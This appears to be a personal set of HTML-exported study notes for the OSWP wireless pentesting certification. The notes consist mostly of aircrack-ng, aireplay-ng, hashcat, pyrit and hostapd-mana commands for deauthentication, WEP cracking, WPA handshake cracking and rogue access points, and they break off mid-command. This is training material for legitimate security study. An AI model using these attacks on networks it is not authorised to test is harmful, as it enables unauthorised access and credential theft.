<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>my-oswp-notes.ctb</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title level-1'>OSWP</h1><br/><p> install ristretto for image</p><p> </p><p> remember to use </p><p> </p><p> airodump-ng --band abg wlan0mon</p><p> </p><p> </p><p>☑ WEP</p><p>☑ WPS</p><p>☑ WPA/WPA2-PSK</p><p>☑ WPA/WPA2- Enterprise</p><p>☑ captive portal</p><p>☑ Password Cracking  </p></div><div class='page'><h1 class='title level-1'>Basic commands</h1><br/><p></p><p></p><p>Basic Commands :-</p><p>• iw dev</p><p>• iw dev wlan1 scan | grep &quot;SSID&quot;</p><p>• ssh &lt;username&gt;@&lt;target_ip&gt; -p&lt;port&gt;     <span style="color:#362e26;">                   ## connecting to the target system with SSH information provided by @offsec</span></p><p>• systemctl restart NetworkManager.service</p><p>	</p><p>	</p><p>	</p></div><div class='page'><h1 class='title level-1'>Aircrack-ng</h1><br/><p>more the 20 tools</p><p></p><p></p><p><code>aircrack-ng -r &lt;DB NAME&gt; &lt;.CAP FILENAME&gt;</code></p></div><div class='page'><h1 class='title level-2'>Airmon-ng</h1><br/><p></p><p><strong>Aimon-ng</strong></p><p></p><p><strong>airmon-ng - see if detect chipset/drivers</strong></p><p><strong></strong></p><p><strong>Airmon-ng check  - check if any proccess is problematic airmon-ng check kill - kill the proccess</strong></p><p><strong></strong></p><p><strong>Airmon-ng check kill</strong></p><p><strong></strong></p><p><strong>airmon-ng start wlan0 - start monitor mode airmon-ng start wlan0 3 - Start monitor mode on channel 3 airmon-ng stop mon0 - stop monitor mode</strong></p><p><strong></strong></p><p><strong>sudo airmon-ng start wlan0 2</strong></p><p></p><p>where 2 is the channal number where we want to enable monitor mode of our adapter</p><p></p><p></p><p>• sudo iw dev wlan0mon info  ---- to check with channel  /  sudo iwconfig wlan0mon</p></div><div class='page'><h1 class='title level-2'>Airodump-ng</h1><br/><p></p><p><strong>Airodump-ng</strong></p><p></p><p>Airodump -ng used for</p><p>• WEP Initializtion Vector</p><p>• to capture raw 802.11 frames </p><p>• WPA/Wpa2 handshake</p><p></p><p>Usage :-</p><p>	•  to only capture on specific channel use only  -c channel_number(  -c 2 )</p><p>	• --write</p><p>	• --channel</p><p>	• --bssid</p><p></p><p>Upper Portion - </p><p>• <span style="color:#e01b24;">power(pwr)</span> --- signal strength --- increase towads positive if signal gets strong. (negative no. will move towards positive)</p><p>• <span style="color:#e01b24;">RXQ </span>- recieved quality --- is measured by percentage -- of successfully recieved frames -- -over last 10 sec</p><p>• <span style="color:#e01b24;">data </span>-- -captured no of data packets  -- If WEP is used - it indicated unique IV counts - also shows data broadcast packets</p><p>• <span style="color:#e01b24;">#/s</span> -- the number sign indicates the number of data packets per second over last 10 seconds</p><p>• <span style="color:#e01b24;">CH</span> -- channel no is taken from beacon frames. n some cases frames from one channel may be captured on another channel due to channel overlap.</p><p>• <span style="color:#e01b24;">beacons </span>-- sent by AP</p><p>• <span style="color:#e01b24;">bssid</span> -- mac address</p><p>• <span style="color:#e01b24;">essid </span>-- name of wifii</p><p>• <span style="color:#e01b24;">MB </span>-  is the maximum speed supported by the AP. </p><p>• <span style="color:#e01b24;background-color:#000000;">ENC</span><span style="background-color:#000000;"> </span>- indicates the encryption algorithm in use.  OPN, if shown, means there is no encryption.</p><p>• <span style="color:#e01b24;">CIPHER</span> - CCMP is detected security protocol</p><p>• <span style="color:#e01b24;">AUTH</span> - Detected Authentication protocol</p><p></p><p></p><p><strong><span style="color:#e01b24;">when network is hidden the essid is represented as length:7 7 can be the no of characters. length 0 to indicated no of characters are hidden intentionnally </span></strong></p><p></p><p>Lower portion -- station sending frames</p><p><span style="color:#e01b24;">Rate</span> : indicates the last used rates between the client the AP. The first number indicates the rate of data from AP to the client, and the second indicates the rate of data from the client to the AP. Note that the Rate column will only be displayed when we are locked onto a single channel. It won’t be visible when channel hopping. </p><p><span style="color:#e01b24;">Lost</span> :   measures lost frames originating from the client station.</p><p><span style="color:#e01b24;">Frames</span> : indicates the number of data frames sent by the client. </p><p><span style="color:#e01b24;">Notes </span>: will indicate if the particular client has done a handshake, or if it sees PMKID</p><p></p><p></p><p><strong><span style="background-color:#e01b24;">Percision scanning is scanning for specific AP.</span></strong></p><p></p><p></p><p>Airodump-ng Output Files :</p><p>	• -w option,</p><p>	• formats - PCAP, CSV, Kismet legacy CSV, Kismet legacy NetXML, and Log CSV. </p><p>	• to use a specific format we use <span style="background-color:#e01b24;">--output-format cdv, pcap </span></p><p></p><p></p><p>Interactive keys :</p><p>	• <span style="color:#e01b24;"> space </span>- pause capture continues in bg</p><p>	• <span style="color:#e01b24;"> tab</span> - enbles/disables scrolling</p><p>	• <span style="color:#e01b24;"> M </span>- colored options</p><p>	• <span style="color:#e01b24;"> A -</span> different display options</p><p>	• <span style="color:#e01b24;"> S</span> - diffenent sorting options </p><p>	•  <span style="color:#e01b24;">I </span>- invert the selected sorting </p><p>	• <span style="color:#e01b24;"> D</span> - default sort - power level</p><p>	 </p><p> </p><p>To scan all bands :-</p><p> </p><p><strong><span style="color:#e01b24;"> airodump-ng --band abg -c channel --bssid bssid interface</span></strong></p><p> </p><p> </p></div><div class='page'><h1 class='title level-2'>Aireplay-ng</h1><br/><p></p><p><strong><span style="color:#e01b24;">Aireplay-ng</span></strong><span style="color:#e01b24;"> </span></p><p>used for generating wireless traffics</p><p></p><p>Attack            Attack Name</p><p>------            -----------</p><p># 0               ## Deauthentication											</p><p># 1               ## Fake Authentication </p><p># 2               ## Interactive Packet Replay</p><p># 3               ## ARP Request Replay Attack </p><p># 4               ## KoreK ChopChop Attack </p><p># 5               ## Fragmentation Attack </p><p># 6               ## Café-Latte Attack </p><p># 7               ## Client-Oriented Fragmentation Attack </p><p># 9               ## Injection Test </p><p></p><p></p><p></p><p><strong><span style="color:#e01b24;">-0 : deauth</span></strong></p><p>performing a deauthentication attack against AP</p><p>•  aireplay-ng -0 1 -a &lt;AP_MAC&gt; -c &lt;Client_MAC&gt; &lt;interface&gt;  </p><p></p><p><strong><span style="color:#e01b24;">-1 : Fake Authentication </span></strong></p><p>performing a fake authentication attack against AP</p><p> aireplay-ng -1 0 -e &lt;ESSID&gt; -a &lt;AP_MAC&gt; -h &lt;Your_MAC&gt; &lt;interface&gt; </p><p> </p><p><strong><span style="color:#e01b24;">-2 : Interactive Packet Replay Attack</span></strong></p><p>• aireplay-ng -2 -b &lt;AP_MAC&gt; -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 &lt;interface&gt;     ## performing a interactive packet replay attack against AP</p><p></p><p><strong><span style="color:#e01b24;">-3 ARP Request Replay Attack </span></strong></p><p>• aireplay-ng -3 -b &lt;AP_MAC&gt; -h &lt;Your_MAC&gt; &lt;interface&gt;                             ## performing a ARP Request Replay attack against AP</p><p></p><p>-4 <strong><span style="color:#e01b24;">Korek ChopChop Attack</span></strong></p><p>aireplay-ng -4 -b &lt;AP_MAC&gt; -h &lt;Your_MAC&gt; &lt;interface&gt;                             ## performing a korek chopchop attack against AP</p><p></p><p>-5 <strong><span style="color:#e01b24;">Fragmentation Attack</span></strong></p><p>aireplay-ng -5 -b &lt;AP_MAC&gt; -h &lt;Your MAC&gt; &lt;interface&gt;                             ## performing a fragmentation attack against AP</p><p>  </p><p></p><p>   </p><p><strong><span style="color:#e01b24;">-9 : injection test </span></strong></p><p>• if a perticular AP can be injected or not on a specific channel</p><p>Types of Injection test</p><p>• basic injection test </p><p>               ⇒ Injection Test: <strong><span style="color:#e01b24;">aireplay-ng -9 mon0</span></strong> - Single card</p><p>               ⇒ <strong><span style="color:#e01b24;">aireplay-ng -9 -i </span></strong>(revieving card wlan1) (mon0)</p><p></p><p>• injection test from specific essid</p><p>		-e essid</p><p>		-a bssid</p><p>		-D : disable AP detection</p><p></p><p>• card to card --- garenty injection</p><p></p><p>• for error :- </p><p></p><p><img src="images/4-1.png" alt="images/4-1.png" /></p><p></p><p></p><p></p></div><div class='page'><h1 class='title level-2'>aircrack-ng</h1><br/><p></p><p><strong>aircrack-ng</strong></p><p></p><p>aircrack-ng -S --- for speed test </p><p></p><p>deaunthication may not work on 802.11w( Protected Management Frames) ...unencrypted deauth frames are ignored.</p><p></p><p>To confirm if the captured key is correct we need to check with airdecap-ng</p><p></p><p>airdecap-ng -b bssid -e essid -p password_cracked wpa_cap_file.cap</p><p></p><p>wpa -- 8 to 63 character</p><p></p></div><div class='page'><h1 class='title level-2'>Airdecap-ng</h1><br/><p></p><p><strong>Airdecap-ng</strong></p><p></p><p>used after key for WEP, WPA PSK , WPA2 PSk is retrived.</p><p></p><p>Removing Wireless Headers :-</p><p></p><p></p><p>captured file contains a lot of frames that we are not intrested in . One use of Airdecap-ng is to remove the wireless headers from unencrypted capture files.</p><p></p><p>airdecap-ng -b bssid file.cap</p><p></p><p></p></div><div class='page'><h1 class='title level-2'>Airegraph-ng</h1><br/><p></p><p><strong>Airegraph-ng</strong></p><p></p><p>Use - To create a graph of network</p><p></p><p>Two types of graph :-</p><p><span style="color:#e01b24;">1. 	Client to AP graph(CAPR)</span></p><p><span style="color:#e01b24;">2. 	Clients Probe Graph(CPG)</span></p><p></p><p>colors used in graph :-</p><p><span style="color:#33d17a;">green - wpa</span></p><p><span style="color:#e01b24;">red - open</span></p><p><span style="color:#f6d32d;">yellow - wep</span>  </p><p>black - unknown </p><p></p><p></p><p><strong>airegraph-ng </strong><strong><span style="color:#ff7800;">-i file.csv</span></strong><strong> </strong><strong><span style="color:#071ba3;">-o cap.png</span></strong><strong> </strong><strong><span style="color:#e01b24;">-g CAPR</span></strong><strong>/</strong><strong><span style="color:#e01b24;">CPG</span></strong></p><p></p><p>-i : input file.csv captured by airodump-ng</p><p>-o : output file</p><p>-g : graph type </p><p></p><p> install ristretto for image viewing</p><p> </p><p> </p><p> </p></div><div class='page'><h1 class='title level-2'>Aircrack-ng suite</h1><br/><p>Aircrack-ng does not work when theauthentication is Enterprise and shown as MGT, as itrequires a different set of tools.</p><p></p><p></p><p>Some wireless drivers ignore directeddeauthentication and only respond to broadcast deauthentication. We can run the same aireplay-ng deauthentication command without the -c parameter to send broadcast deauthentication.</p><p></p><p></p><p>some times 802.11w Protected management frames are in use, where unencrypted deauthentication framesare ignored. Then the only course of action is to waitfor a client to connect.</p><p></p><p></p><p>aircrack-ng -w wordlist.txt -e essid -b bssid file.cap</p><p></p><p></p><p></p><p>It’s possible that we captured a client’sunsuccessful attempt  to connect to the network. This is where we make use of theadditional traffic we captured</p><p>between the client and the AP.</p><p>To confirm the key is correct, let’sdecrypt our traffic with airdecap-ng.</p><p></p><p>airdecap-ng -b bssid -e essid -p password file.cap</p><p></p><p></p><p></p><p></p></div><div class='page'><h1 class='title level-1'>Password Cracking</h1><br/><p>WPA supports two types of authentication methods</p><p></p><p>1. PSK - pre shared key</p><p>2. Enterprise</p><p></p><p></p><p>WPA, WPA2, WPA3 all rely on hashes for keys</p><p></p><p>this are one way hash so decrypting or cracking the hash takes efforts</p><p></p><p>we will do this by followings:</p><p>1. Get the handshake</p><p>2. make a guess at passphrase and send the guess to the hash function</p><p>3. compare the output from hashfunction to the handshake</p><p>4. if match we get the password</p><p></p><p></p><p>Length of Passphrase can be from 8 to 63 characters</p><p></p><p>There is no difference between cracking WPA and WPA2 hashes,</p><p></p><p>WPA3 shares similarities with WPA,  but it uses the much stronger SimultaneousAuthentication of Equals, and it is not yet vulnerable to offlineattacks.</p><p> same goes for Opportunistic WirelessEncryption (OWE).</p><p> </p><p> </p><p> </p></div><div class='page'><h1 class='title level-2'>custom wordlist</h1><br/><p><strong><span style="background-color:#e01b24;">try and look for default password using oui( Organizational Unique Identifier) ( first 6 char of MAC address </span></strong><a href="http://www.wireshark.org/tools/oui-lookup.html">http://www.wireshark.org/tools/oui-lookup.html</a>  )</p><p></p><p>We will use 3 tools for generating custom wordlist</p><p></p><p><strong><span style="color:#e01b24;">• John The Ripper</span></strong></p><p><strong><span style="color:#e01b24;">• Crunch</span></strong></p><p><strong><span style="color:#e01b24;">• RSMangler</span></strong><span style="color:#e01b24;"></span></p><p><span style="color:#e01b24;"></span></p><p></p><p>-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</p><p><strong><span style="color:#e01b24;">John The Ripper</span></strong><strong> :</strong></p><p></p><p>• JtR’s default mangling rules only append one digit to the end of each word. Let’s add two additional rulesthat append two and three digits to the end of eachword in the wordlist.</p><p></p><p>• The JtR mangling rules are located in a john configuration file - /etc/john/john.conf </p><p></p><p>• add following line near line no 961 :</p><p></p><p>	#Add two numbers to end of each password</p><p>	$[0-9]$[0-9]</p><p>	$[0-9]$[0-9]$[0-9]</p><p></p><p></p><p>• sudo john --wordlist=wordlist.txt --rules --stdout | grep -i “password you want add numbers ” </p><p></p><p>• full command to directly input wordlist with Johntheripper in aircrack-ng :</p><p></p><p>	sudo john --wordlist=wordlist.txt --rules --stdout |  aircrack -ng -e essid -w - file.cap</p><p></p><p>--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</p><p></p><p><strong><span style="color:#e01b24;">RSMangler :</span></strong></p><p><strong><span style="color:#e01b24;"></span></strong></p><p><strong><span style="color:#e01b24;"></span></strong>• RSMangler is a Ruby scriptthat takes words as input and modifiesthem in multiple ways,such as changing case, switching order,using “leetspeak”, adding numbers,and so on in order to create anon-repeating wordlist.</p><p></p><p>• All of RSMangler&#39;s word manipulation options are on by default, but we can add parameters to the command line to turn individual options off.</p><p></p><p>• first create file with words or passwords.</p><p>• process that file to rsmangles --file wordlist.txt</p><p>• to save --output wordlist </p><p>• -min 10 max 12 options can also be used.</p><p></p><p>• full command to directly input wordlist with Johntheripper in aircrack-ng :</p><p>   rsmangler -file wordlist.txt --min 12--max 13 | aircrack-ng -e essid file.cap -w -</p><p></p><p></p><p></p><p>-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</p><p></p><p><strong><span style="color:#e01b24;">Cracking with Pyrit</span></strong></p><p><strong><span style="color:#e01b24;"></span></strong></p><p>airmon-ng start &lt;interface&gt; &lt;AP_Channel&gt;                                  ## setting the wireless card (wlan0) to monitor mode</p><p>• pyrit -r &lt;interface&gt; -o &lt;capture_file&gt; stripLive                          ## using pyrit to sniff in monitor mode interface by saving the capture process to a file</p><p>• aireplay-ng -0 1 -a &lt;AP_MAC&gt; -c &lt;Client_MAC&gt; &lt;interface&gt;                  ## performing a deauthentication attack against AP to capture the handshake packet</p><p>• pyrit -r &lt;capture_file&gt; -i &lt;wordlist&gt; -b &lt;AP_MAC&gt; attack_passthrough      ## cracking WPA password with pyrit in dictionary mode</p><p>   or</p><p>• pyrit -i &lt;wordlist&gt; import_passwords                                      ## import word list to crack WPA password in pyrit with database mode                         </p><p>• pyrit -e &lt;ESSID&gt; create_essid                                             ## adding the ESSID of the access point to the pyrit database</p><p>• pyrit batch                                                               ## creating PMKs for ESSID</p><p>• pyrit -r &lt;capture_file&gt; -b &lt;AP_MAC&gt; attack_db                             ## cracking WPA password in database mode with pyrit</p><p>   </p></div><div class='page'><h1 class='title level-3'>Crunch</h1><br/><p></p><p><strong><span style="color:#e01b24;">Crunch</span></strong></p><p></p><p>• Given a pattern and a character set or words, Crunch is able to generate all possible combinations. The crunch command only requires us to specify the first two parameters, namely the minimum length and maximum length of the password. WPA requires passphrases between eight and 63 characters.</p><p></p><p>• crunch min max WordsToUse </p><p>• -t can be used to define characterset like </p><p>         - @ lowercase</p><p>         - , uppercase</p><p>         - %numbers</p><p>         - ^ symbols</p><p></p><p>• example -  crunch 11 11 -t Password%%%</p><p></p><p>-p to add words or specific characters</p><p></p><p>example -  crunch 5 5 -t ddd%% -p dog cat bird</p><p></p><p>output :</p><p></p><p><img src="images/17-1.png" alt="images/17-1.png" /></p><p></p><p></p><p></p><p>e.g</p><p></p><p>crunch 7 7 -t p@ss,%^ -l a@aaaaa</p><p>       crunch will now treat the @ symbol as a literal character and not replace the character with a uppercase letter.</p><p>       this will generate</p><p>       p@ssA0!</p><p>       p@ssA0@</p><p>       p@ssA0#</p><p>       p@ssA0$</p><p>       &lt;skipped&gt;</p><p>       p@ssZ9</p><p></p><p></p><p><img src="images/17-2.png" alt="images/17-2.png" /></p><p></p></div><div class='page'><h1 class='title level-2'>hashcat</h1><br/><p>Hashcat uses GPU</p><p></p><p>only pocl openc cl is not recommended</p><p></p><p>hascat benchmark - speed estimate to crack password</p><p>• hashcat -b</p><p>• for wifi cracking we mostly use wpa/wpa2-eapol-pbkdf2  hashes</p><p>• hashcat -b -m 2500</p><p></p><p></p><p></p><p>Hashcat utilities</p><p></p><p>important package --  use/lib/hashcat-utils</p><p></p><p>• cap2hccapx.bin ←  cap export to hccpacx  for hash cat cracking - We’ll notice one utility that is specifically relevant for our purposes. It exports WPA handshakes from PCAP files to HCCAPx, a format used by hashcat for WPA/WPA2 handshakes</p><p></p><p>converting cap to hccapx</p><p>/lib/hashcat-utils/cap2hccapx.bin wpa.cap output.hccapx</p><p></p><p>using hashcat to crack password :</p><p>hashcat -m 2500 output.hccapx wordlist.txt</p><p></p><p></p><p></p><p></p><p></p><p> </p></div><div class='page'><h1 class='title level-2'>Airolib-ng</h1><br/><p></p><p><strong><span style="color:#e01b24;">Airolib-ng is a tool designed to store and manage ESSID and password lists,compute their Pairwise Master Keys (PMK), and use them in order to crack WPA  and WPA2 PSK passphrases.</span></strong></p><p></p><p>• users sqlite3 database</p><p>• speed for cracking increases</p><p></p><p></p><p>S<strong>ummary commands</strong> :</p><p>• <span style="color:#e01b24;">airolib-ng anyname.sqlite --import essid essid.txt</span></p><p>• <span style="color:#e01b24;">airolib-ng anyname.sqlite --stats</span></p><p>• <span style="color:#e01b24;">airolib-ng anyname.sqlite --import passwd wordlist.txt</span></p><p>• <span style="color:#e01b24;">airolib-ng anyname.sqlite --batch</span></p><p>• <span style="color:#e01b24;">aircrack-ng -r anyname.sqlite file.cap</span></p><p></p><p></p><p><strong>Steps to create database in airolib-ng and use for cracking</strong> :</p><p>1. essid.txt</p><p>2. import the ESSIDtext file into the airolib-ng database</p><p>	<span style="color:#e01b24;">airolib-ng anyname.sqlite --import essid essid.txt</span></p><p></p><p>3. Passing --stats to airolib-ng displays information about our database,including the ESSIDs and numberof passwords that are stored.</p><p> 	<span style="color:#e01b24;">airolib-ng anyname.sqlite --stats</span></p><p> </p><p>4. Importing password - only valid credentions will be imported that is between 8 to 63 characters</p><p>	<span style="color:#e01b24;">airolib-ng anyname.sqlite --import passwd wordlist.txt</span></p><p>	</p><p>5.With the network ESSID and password list imported,we can have airolib-ng batchprocess all of the corresponding PMKs</p><p></p><p>	<span style="color:#e01b24;">airolib-ng anyname.sqlite --batch</span></p><p>	</p><p>6. Once generated we can use these PMKs against APs that have the same ESSID. Once the batch operation is complete, the output shows that all possible combinations have been computed for our combination of ESSID and passwords.</p><p></p><p>7. Now, instead of usinga wordlist with aircrack-ng, we can pass the databasename using -r instead.</p><p></p><p>	<span style="color:#e01b24;">aircrack-ng -r anyname.sqlite file.cap</span></p><p>		</p><p>		</p><p></p></div><div class='page'><h1 class='title level-2'>cowpatty</h1><br/><p></p><p><strong>It is a versatile tool that recovers WPA pre-shared keys using both dictionary and rainbow table attacks.</strong></p><p></p><p></p><p>Rainbow table mode :-</p><p>• The main purpose behind using coWPAttyis to use the pre-computed hashes, similar to airolib-ng, to crack a WPA passphrase. Using these rainbow tables, which are pre-computed hashes, significantly reduces the time required to crack WPA passphrases as all of the computation is done ahead of time.</p><p></p><p>• An important point to keep in mind when using pre-computed hashes is that they need to be generated for each unique ESSID.</p><p></p><p>• The ESSID is combined with the WPA pre-shared key to create the hash.</p><p></p><p>• coWPAtty includes a tool, genpmk, thatgenerates the required rainbow tables.</p><p></p><p>	<strong><span style="color:#e01b24;">genpmk -f wordlist -d output file -s essid</span></strong></p><p>	</p><p>• <strong><span style="color:#e01b24;">cowpatty -r file.cap -d outout_file_saved_genpmk -s essid</span></strong></p><p></p><p>------------------------------------------------------------------------------------------------------------------------------------------------------------</p><p># coWPAtty needs a full valid handshake, check if it can use it</p><p>cowpatty -r &lt;CAPTURE_NAME&gt; -c</p><p></p><p>cowpatty -r file.cap -f wordlist -2 -s &lt;bssid&gt;</p><p></p><p>where -2 is for no scripts mode </p></div><div class='page'><h1 class='title level-1'>ROUGUE Access Point</h1><br/><p></p><p><strong><span style="color:#e01b24;">We’ll use this attack to grab WPA pre-shared keys.</span></strong></p><p></p><p>• When a client connects to a wireless network, the device will save the network into a list called the Preferred Network List (PNL). A PNL allows devices to reconnect to a familiar network when it is detected again.</p><p></p><p>• Even though we might not have the same pre-shared key (PSK) as the AP the client was expecting, we will be able to capture the first two messages of the 4-way handshake. This should give us just the right amount of information to crack the PSK.                </p><p></p><p>• Many devices  save the encryption details inthe PNL when the network is saved. This means for a successful attack, our rogue AP will have to match the encryption details of the target.</p><p></p><p></p><p></p><p><strong>Using airodump-ng suit</strong> :</p><p></p><p>	<strong><span style="color:#e01b24;">airodump-ng -w discovery --output -format pcap wlan0mon</span></strong></p><p></p><p>In wireshark using .cap or .pcap file filtering out becons packet of specific ssid  :-</p><p></p><p>	• <span style="color:#e01b24;">wlan.fc.type_subtype == 0x08</span> &amp;&amp; wlan.ssid == “ essid here”</p><p>			in above filter, Management frames use type “0”,and beacon frames use a subtype of “8”</p><p>	• Vendor specific tagg ---wpa 1</p><p>	• <span style="color:#e01b24;">RSN tag -- supports wpa2   --- tkip or ccnp </span></p><p>	• authenticate with a PSK -  based on the Auth KeyManagement configuration.</p><p></p><p><strong>Creating Rogue AP</strong><strong><span style="color:#e01b24;"> :-</span></strong></p><p></p><p><strong>using hostapd-mana</strong> :-</p><p>• a daemon which creates AP using Wi- Fi network adapters.</p><p>• In order to run hostapd-mana, we will need to build a configuration file  which defines the AP configuration and sets a location for the captured handshakes.</p><p>• Configuration file -  /etc/hostapd-mana/hostapd-mana.conf we can also create our own hostapd-mana configuration file. (any-name.conf)</p><p>• <strong>Contents/Parameters</strong> - </p><p>         1&gt; <span style="color:#e01b24;">interface name</span>=</p><p>                  • wlan0 </p><p>                  • wlan1</p><p>         2&gt; <span style="color:#e01b24;">ssid</span>= essid</p><p>         3&gt; <span style="color:#e01b24;">channel</span>= 1,2,3,4,5, etc.</p><p>         4&gt; <span style="color:#e01b24;">driver=nl80211</span>  </p><p>                  • By default, hostapd-manawill run in 802.11b. you can change e.g by setting the ieee80211n parameter to “1”.</p><p>         5&gt; <span style="color:#e01b24;">hw_mode=g(2.4Ghz) or a(5Ghz) (hw_mode=g -&gt; 2.4 GHz y 54 Mb)</span></p><p>         6&gt; <span style="color:#e01b24;">wpa=</span></p><p>                  • wpa=1 -&gt; activate only WPA</p><p>                  • wpa=2 -&gt; activate only WPA2</p><p>                  • wpa=3 -&gt; to enable both WPA and WPA2.</p><p>         7&gt; <span style="color:#e01b24;">wpa_key_mgmt=WPA-PSK</span></p><p>                  • authenticationto PSK and set the key as well e.g set wpa_key_mgmt to “WPA-PSK”</p><p>         8&gt; <span style="color:#e01b24;">wpa_passphrase=ANYPASSWORD</span></p><p>                  • passphrase in the case of PSK auth, we can set anything here, we don&#39;t care it&#39;s wrong</p><p>         9&gt;  <span style="color:#e01b24;">wpa_pairwise=TKIP CCMP</span> -&gt; TKIP or CCMP encryption with WAP1 </p><p>         	    <span style="color:#e01b24;">rsn_pairwise=TKIP CCMP</span> -&gt; TKIP or CCMP encryption with WPA2</p><p>                  • Encryption type (if the target is exclusiveliy WPA1 use just one of the following):</p><p>                  • wpa and rsn pairwise settings to “TKIP CCMP” for WPA1 and WPA2 respectively in order to match the encryptionsettings of the target AP.</p><p>                  • The cipher suite for multicast trafficis automatically set by hostapd-mana,so we don’t need to modifythe configuration for it</p><p>         10&gt; <span style="color:#e01b24;">mana_wpaout</span>=/home/file.hccapx </p><p>                  • Finally, we need to configure the“mana” portion of hostapd-mana. mana_wpaout which will specify where tosave the captured handshakes. Each captured handshakewill be appended to this file.</p><p></p><p>Example file - </p><p><img src="images/13-1.png" alt="images/13-1.png" /></p><p></p><p>With the configuration file complete,  we can start hostapd-mana</p><p></p><p><strong>CAPTURING HANDSHAKES</strong><span style="color:#e01b24;"> </span>- </p><p></p><p>To start hostapd-mana:</p><p><strong><span style="color:#e01b24;">sudo hostapd-mana our_save_conf_file.conf</span></strong></p><p><strong><span style="color:#e01b24;"></span></strong></p></div><div class='page'><h1 class='title level-2'>Examples</h1><br/><p><strong>• hostap with no encryption:</strong></p><p>interface=wlan1</p><p>ssid=hostel-A</p><p>hw_mode=g</p><p>channel=6</p><p>driver=nl80211</p><p></p><p><strong>• hostap with wep:</strong></p><p>interface=wlan1</p><p>hw_mode=g</p><p>channel=6</p><p>driver=nl80211</p><p>ssid=hostel-A</p><p>auth_algs=1</p><p>wep_default_key=0</p><p>wep_key0=&quot;54321&quot;</p><p></p><p><strong>• hostap with WPA-PSK:</strong></p><p>interface=wlan1</p><p>hw_mode=g</p><p>channel=6</p><p>driver=nl80211</p><p>ssid=HomeAlone</p><p>auth_algs=1</p><p>wpa=1</p><p>wpa_key_mgmt=WPA-PSK</p><p>wpa_pairwise=TKIP</p><p>wpa_passphrase=welcome@123</p><p></p><p><strong>• hostap with WPA2-PSK:</strong></p><p></p><p>interface=wlan1</p><p>hw_mode=g</p><p>channel=6</p><p>driver=nl80211</p><p>ssid=Lost-in-space</p><p>auth_algs=1</p><p>wpa=1</p><p>wpa_key_mgmt=WPA-PSK</p><p>wpa_pairwise=CCMP</p><p>wpa_passphrase=beautifulsoup</p><p></p><p># SSID 2</p><p>bss=wlan1_0</p><p>ssid=LOCOMO-Mobile-hotspot</p><p>auth_algs=1</p><p>wpa=1</p><p>wpa_key_mgmt=WPA-PSK</p><p>wpa_pairwise=CCMP</p><p>wpa_passphrase=beautifulsoup</p><p></p><p></p><p>alternative:</p><p>interface=wlan1</p><p>hw_mode=g</p><p>channel=6</p><p>driver=nl80211</p><p></p><p>ssid=Lost-in-space</p><p>auth_algs=1</p><p>wpa=2</p><p>wpa_key_mgmt=WPA-PSK</p><p>rsn_pairwise=CCMP</p><p>wpa_passphrase=beautifulsoup</p></div><div class='page'><h1 class='title level-1'>WEP cracking</h1><br/><p></p><p><strong><span style="color:#e01b24;">For 64bites / 128 bites  : 20,000/1,000,00 IVS foir cracking</span></strong></p><p></p><p>• With clients (easy to get IVS)</p><p><img src="images/34-1.png" alt="images/34-1.png" /></p><p></p><p></p><p>Steps to crack :- </p><p><strong><span style="color:#e01b24;">1. airodump-ng -c &lt;AP_Channel&gt; --bssid &lt;AP_MAC&gt; -w wep wlan0</span></strong></p><p>need #data about 20,000 for 64 bit and 10k for 128bit</p><p></p><p><strong><span style="color:#e01b24;">2. aireplay-ng -1 0  -a bssid wlan0 </span></strong> --------- fake authentication</p><p></p><p><strong><span style="color:#e01b24;">3. aireplay-ng -5 -b bssid  -h &lt;your mac&gt; wlan1mon</span></strong>    -------------  Fragmentation Attack </p><p></p><p><img src="images/34-2.png" alt="images/34-2.png" /></p><p></p><p> It will save the keystream as a <strong>.xor</strong> file and display the file name in your shell.</p><p></p><p><strong><span style="color:#e01b24;">4. packetforge-ng -0  -a [BSSID]  -h [Your MAC]  -w [ARP filename]  -y [filename.xor]  -k 255.255.255.255  -l 255.255.255.255</span></strong></p><p></p><p>Using the <strong>.xor</strong> file we saved - we can create an ARP-Reply package and inject it to the network to stimulate the flow of IVs.</p><p></p><p><img src="images/34-3.png" alt="images/34-3.png" /></p><p></p><p><strong><span style="color:#e01b24;">5. aireplay-ng -2  -r [ARP filename]  [Interface]</span></strong>   --------------------------------- Interactive Packet Replay</p><p></p><p>Upon creating our ARP request packet we can inject it into the network using the aireplay-ng (-2) command</p><p></p><p><img src="images/34-4.png" alt="images/34-4.png" /></p><p></p><p> #data will start increasing</p><p> </p><p></p><p><strong><span style="color:#e01b24;">6. aircrack-ng  -e [ESSID]  [Filename]</span></strong></p><p></p><p><img src="images/34-5.png" alt="images/34-5.png" /></p><p></p><p>-----------------------------------------------------------------------------------------------------------------------------------------------------------------</p><p>Extra : - </p><p></p><p> aireplay-ng -5 -b &lt;AP_MAC&gt; -h &lt;Your MAC&gt; &lt;interface&gt;                             ## performing a fragmentation attack against AP</p><p>   packetforge-ng -0 -a &lt;AP_MAC&gt; -h &lt;Your_MAC&gt; -l &lt;Source_IP&gt; -k &lt;Dest_IP&gt; -y &lt;XOR_file&gt; -w &lt;output_file&gt;     ## creating an ARP request packet using packetforge-ng</p><p>   tcpdump -n -vvv -e -s0 -r &lt;output_file&gt;                                          ## check the contents of the created package</p><p>   aireplay-ng -2 -r &lt;output_file&gt; &lt;interface&gt;                                      ## injecting the generated packet into the network (If the correct pack is injected, the IV amount will increase rapidly.)</p><p>   aircrack-ng &lt;capture_file&gt;                                                       ## cracking WEP key (In order to achieve a successful result, you need to catch a sufficient number of IVs during the attack.)</p><p>  </p><p>   </p><p><strong><span style="color:#e01b24;">Bypassing WEP Shared Key Authentication</span></strong></p><p>   </p><p>   airmon-ng start &lt;interface&gt; &lt;AP_Channel&gt;                                                  ## setting the wireless card (wlan0) to monitor mode</p><p>   airodump-ng -c &lt;AP_Channel&gt; --bssid &lt;AP_MAC&gt; -w &lt;capture_file&gt; &lt;interface&gt;                ## listening to the target AP on the specified channel</p><p>   aireplay-ng -0 1 -a &lt;AP_MAC&gt; -c &lt;Client_MAC&gt; &lt;interface&gt;                                  ## performing a deauthentication attack against AP to capture the PRGA XOR keystream</p><p>   aireplay-ng -1 0 -e &lt;ESSID&gt; -y &lt;keystream file&gt; -a &lt;AP_MAC&gt; -h 